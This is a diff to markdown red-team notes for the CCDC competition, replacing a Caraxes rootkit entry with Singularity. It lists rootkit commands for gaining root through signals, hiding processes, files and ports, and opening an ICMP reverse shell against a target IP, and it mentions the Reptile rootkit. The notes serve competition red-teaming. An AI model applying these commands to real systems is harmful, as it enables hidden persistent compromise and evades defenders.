@@ -103,15 +103,16 @@ pagetitle: Red Teaming for CCDC
       - Can use `ssh_across_ips.py`
         - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
       - `for i in {1..10}; do echo $i; done`
-- [Caraxes](https://github.com/ait-aecid/caraxes/tree/main)
-  - Good compatibility across distros as well
-    - Debian: `apt install -y gcc make linux-headers-$(uname -r)`
-    - RHEL: `yum install -y gcc make kernel-devel-$(uname -r)`
-  - Supports hiding files, backdoors, privescs
-    - Root with `kill -47 0`
-    - Hide process with `kill -48 {proc_id}`
-    - Hide module with `kill -49 0`
-    - Can be specified in `rootkit.h`
+- [Singularity](https://github.com/MatheuZSecurity/Singularity)
+  - Holy balls what a nice rootkit
+    - Supports hiding multiple names, has privesc, ICMP backdoor, hiding services
+      - Root with `MAGIC=mtz bash` or simply `kill -59 $$`
+      - Hide port by editing `modules/hiding_tcp.c` and adding a port to `is_hidden_port`
+      - Hide files containing `singularity`
+      - Hide process with `kill -59 <PID>`
+      - ICMP shell:
+        - Start listener on `8081`
+        - Then run `sudo python3 scripts/trigger.py {IP}` and wait for shell
 - [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
   - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
     - Has persistent, detection evasion, a nice management interface
